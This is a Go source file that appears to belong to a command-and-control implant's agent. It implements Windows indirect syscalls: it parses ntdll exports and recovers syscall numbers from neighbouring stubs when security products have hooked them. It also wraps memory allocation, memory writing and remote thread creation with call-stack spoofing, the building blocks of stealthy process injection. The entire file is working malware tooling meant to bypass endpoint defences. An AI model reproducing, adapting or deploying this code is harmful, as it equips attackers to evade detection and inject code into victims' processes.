//go:build windows

package syscalls

import (
	"encoding/binary"
	"errors"
	"fmt"
	"runtime"
	"sort"
	"sync"
	"syscall"
	"unsafe"

	"tornadoc2/agent/internal/spoof"
)

var (
	ntdll         = syscall.NewLazyDLL("ntdll.dll")
	ntdllBase     uintptr
	syscallInstr  uintptr
	ntdllOnce     sync.Once
	ntdllErr      error
	exportMu      sync.Mutex
	exportsByName map[string]uintptr
	exportsSorted []uintptr
)

type peSection struct {
	va, vsize, raw, rawsize uint32
}

func initNtdll() error {
	ntdllOnce.Do(func() {
		h, err := syscall.LoadLibrary("ntdll.dll")
		if err != nil {
			ntdllErr = fmt.Errorf("LoadLibrary(ntdll): %w", err)
			return
		}
		// ntdll is pinned for the life of the process.
		ntdllBase = uintptr(h)
		if ntdllBase == 0 {
			ntdllErr = errors.New("ntdll base is null")
			return
		}
	})
	return ntdllErr
}

func peSections(base uintptr) ([]peSection, error) {
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return nil, errors.New("bad MZ signature")
	}
	pe := base + uintptr(*(*uint32)(unsafe.Pointer(base + 0x3C)))
	if *(*uint32)(unsafe.Pointer(pe)) != 0x00004550 {
		return nil, errors.New("bad PE signature")
	}
	num := uintptr(*(*uint16)(unsafe.Pointer(pe + 6)))
	optSize := uintptr(*(*uint16)(unsafe.Pointer(pe + 20)))
	table := pe + 24 + optSize
	out := make([]peSection, 0, num)
	for i := uintptr(0); i < num; i++ {
		s := table + i*40
		out = append(out, peSection{
			vsize:   *(*uint32)(unsafe.Pointer(s + 8)),
			va:      *(*uint32)(unsafe.Pointer(s + 12)),
			rawsize: *(*uint32)(unsafe.Pointer(s + 16)),
			raw:     *(*uint32)(unsafe.Pointer(s + 20)),
		})
	}
	return out, nil
}

func rvaToPtr(base uintptr, sections []peSection, rva uint32,
	size uint32) (uintptr, error) {
	for _, s := range sections {
		if rva >= s.va && rva+size <= s.va+s.vsize {
			return base + uintptr(rva), nil
		}
	}
	return 0, fmt.Errorf("rva %#x not mapped", rva)
}

func parseExports() error {
	if exportsByName != nil {
		return nil
	}
	if err := initNtdll(); err != nil {
		return err
	}
	sections, err := peSections(ntdllBase)
	if err != nil {
		return err
	}
	pe := ntdllBase + uintptr(*(*uint32)(unsafe.Pointer(ntdllBase + 0x3C)))
	magic := *(*uint16)(unsafe.Pointer(pe + 24))
	dirOff := uintptr(pe + 24 + 112) // PE32+
	if magic == 0x10B {
		dirOff = pe + 24 + 96 // PE32
	}
	expRVA := *(*uint32)(unsafe.Pointer(dirOff))
	expSize := *(*uint32)(unsafe.Pointer(dirOff + 4))
	if expRVA == 0 || expSize == 0 {
		return errors.New("ntdll has no export directory")
	}
	exp, err := rvaToPtr(ntdllBase, sections, expRVA, expSize)
	if err != nil {
		return err
	}
	numNames := *(*uint32)(unsafe.Pointer(exp + 24))
	namesRVA := *(*uint32)(unsafe.Pointer(exp + 32))
	ordsRVA := *(*uint32)(unsafe.Pointer(exp + 36))
	funcsRVA := *(*uint32)(unsafe.Pointer(exp + 28))
	names, err := rvaToPtr(ntdllBase, sections, namesRVA, numNames*4)
	if err != nil {
		return err
	}
	ords, err := rvaToPtr(ntdllBase, sections, ordsRVA, numNames*2)
	if err != nil {
		return err
	}
	funcs, err := rvaToPtr(ntdllBase, sections, funcsRVA, numNames*4)
	if err != nil {
		return err
	}

	byName := make(map[string]uintptr, numNames)
	seen := make(map[uintptr]struct{})
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(names + uintptr(i)*4))
		ord := *(*uint16)(unsafe.Pointer(ords + uintptr(i)*2))
		fnRVA := *(*uint32)(unsafe.Pointer(funcs + uintptr(ord)*4))
		if fnRVA == 0 {
			continue
		}
		p, err := rvaToPtr(ntdllBase, sections, fnRVA, 1)
		if err != nil {
			continue
		}
		name := cString(ntdllBase + uintptr(nameRVA))
		if name == "" {
			continue
		}
		byName[name] = p
		if _, ok := seen[p]; !ok {
			seen[p] = struct{}{}
			exportsSorted = append(exportsSorted, p)
		}
	}
	sort.Slice(exportsSorted, func(i, j int) bool {
		return exportsSorted[i] < exportsSorted[j]
	})
	exportsByName = byName
	return nil
}

func cString(p uintptr) string {
	var n int
	for n < 512 {
		if *(*byte)(unsafe.Pointer(p + uintptr(n))) == 0 {
			break
		}
		n++
	}
	if n == 0 {
		return ""
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
}

func stubSSN(addr uintptr) (uint32, bool) {
	// mov r10, rcx; mov eax, imm32   (the canonical ntdll prologue)
	// Some builds use `mov r10, rcx` encoded as 49 89 CA.
	b := (*[8]byte)(unsafe.Pointer(addr))
	if b[3] != 0xB8 {
		return 0, false
	}
	if !((b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1) ||
		(b[0] == 0x49 && b[1] == 0x89 && b[2] == 0xCA)) {
		return 0, false
	}
	return binary.LittleEndian.Uint32(b[4:8]), true
}

func resolveSSN(funcName string) (uint32, error) {
	if runtime.GOARCH != "amd64" {
		return 0, errors.New("indirect SSN resolution is amd64-only")
	}
	exportMu.Lock()
	defer exportMu.Unlock()
	if err := parseExports(); err != nil {
		return 0, err
	}
	addr, ok := exportsByName[funcName]
	if !ok {
		return 0, fmt.Errorf("%s not exported by ntdll", funcName)
	}
	if ssn, ok := stubSSN(addr); ok {
		return ssn, nil
	}

	// The stub is hooked. SSNs are assigned in address order, so a
	// clean neighbour gives the target's SSN by offset.
	idx := sort.Search(len(exportsSorted), func(i int) bool {
		return exportsSorted[i] >= addr
	})
	if idx == len(exportsSorted) || exportsSorted[idx] != addr {
		return 0, fmt.Errorf("%s: address not in export table", funcName)
	}
	for dist := 1; dist <= 24; dist++ {
		for _, j := range []int{idx - dist, idx + dist} {
			if j < 0 || j >= len(exportsSorted) {
				continue
			}
			if ssn, ok := stubSSN(exportsSorted[j]); ok {
				delta := int32(idx - j)
				return uint32(int32(ssn) + delta), nil
			}
		}
	}
	return 0, fmt.Errorf("%s: no clean neighbour for SSN", funcName)
}

func findSyscallInstruction(stub uintptr) (uintptr, error) {
	for p := stub; p < stub+64; p++ {
		if *(*byte)(unsafe.Pointer(p)) == 0x0F &&
			*(*byte)(unsafe.Pointer(p + 1)) == 0x05 &&
			*(*byte)(unsafe.Pointer(p + 2)) == 0xC3 {
			return p, nil
		}
	}
	return 0, errors.New("no syscall;ret in stub")
}

func syscallAddress() (uintptr, error) {
	if syscallInstr != 0 {
		return syscallInstr, nil
	}
	exportMu.Lock()
	defer exportMu.Unlock()
	if err := parseExports(); err != nil {
		return 0, err
	}
	// Prefer a sequence inside a real syscall stub.
	for _, name := range []string{
		"NtClose", "NtWaitForSingleObject",
		"NtAllocateVirtualMemory"} {
		if a, ok := exportsByName[name]; ok {
			if p, err := findSyscallInstruction(a); err == nil {
				syscallInstr = p
				return p, nil
			}
		}
	}
	for _, a := range exportsSorted {
		if p, err := findSyscallInstruction(a); err == nil {
			syscallInstr = p
			return p, nil
		}
	}
	return 0, errors.New("no syscall;ret sequence in ntdll")
}

func indirectSyscall(ssn uint32, syscallAddr uintptr,
	a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) (uintptr, uintptr)

func ntSyscall(name string, args ...uintptr) (uintptr, uintptr, error) {
	for len(args) < 11 {
		args = append(args, 0)
	}
	proc := ntdll.NewProc(name)
	if err := proc.Find(); err != nil {
		return 0, 0, fmt.Errorf("resolve %s: %w", name, err)
	}
	addr := proc.Addr()

	if runtime.GOARCH == "amd64" {
		if err := initNtdll(); err == nil {
			if ssn, err := resolveSSN(name); err == nil {
				if instr, err := syscallAddress(); err == nil {
					r1, r2 := indirectSyscall(ssn, instr,
						args[0], args[1], args[2], args[3],
						args[4], args[5], args[6], args[7],
						args[8], args[9], args[10])
					return r1, r2, nil
				}
			}
		}
	}

	// Direct stub fallback (also the arm64 path).
	r1, r2, errno := syscall.SyscallN(addr, args...)
	if errno != 0 {
		return r1, r2, errno
	}
	return r1, r2, nil
}

func status(name string, r1 uintptr) error {
	if r1 == 0 {
		return nil
	}
	return fmt.Errorf("%s status 0x%X", name, r1)
}

func NtAllocateVirtualMemory(processHandle uintptr,
	baseAddress *uintptr, zeroBits uintptr,
	regionSize *uintptr, allocationType, protect uint32) error {
	r1, _, _ := ntSyscall("NtAllocateVirtualMemory",
		processHandle, uintptr(unsafe.Pointer(baseAddress)),
		zeroBits, uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType), uintptr(protect))
	return status("NtAllocateVirtualMemory", r1)
}

func NtWriteVirtualMemory(processHandle uintptr,
	baseAddress uintptr, buffer unsafe.Pointer,
	size uintptr, bytesWritten *uintptr) error {
	r1, _, _ := ntSyscall("NtWriteVirtualMemory",
		processHandle, baseAddress, uintptr(buffer), size,
		uintptr(unsafe.Pointer(bytesWritten)))
	return status("NtWriteVirtualMemory", r1)
}

func NtCreateThreadEx(threadHandle *uintptr,
	desiredAccess, objectAttributes, processHandle uintptr,
	startRoutine, argument, createFlags, zeroBits uintptr,
	stackSize, maximumStackSize, attributeList uintptr) error {
	args := [11]uintptr{
		uintptr(unsafe.Pointer(threadHandle)), desiredAccess,
		objectAttributes, processHandle, startRoutine,
		argument, createFlags, zeroBits, stackSize,
		maximumStackSize, attributeList,
	}
	// A spoofed chain needs the direct ntdll stub so the 11
	// arguments can be forwarded verbatim; the indirect-syscall
	// trampoline takes the SSN in a register the shim cannot set.
	if spoof.Available() {
		if proc := ntdll.NewProc("NtCreateThreadEx"); proc.Find() == nil {
			return status("NtCreateThreadEx",
				spoof.Call11(proc.Addr(), args))
		}
	}
	r1, _, _ := ntSyscall("NtCreateThreadEx", args[:]...)
	return status("NtCreateThreadEx", r1)
}
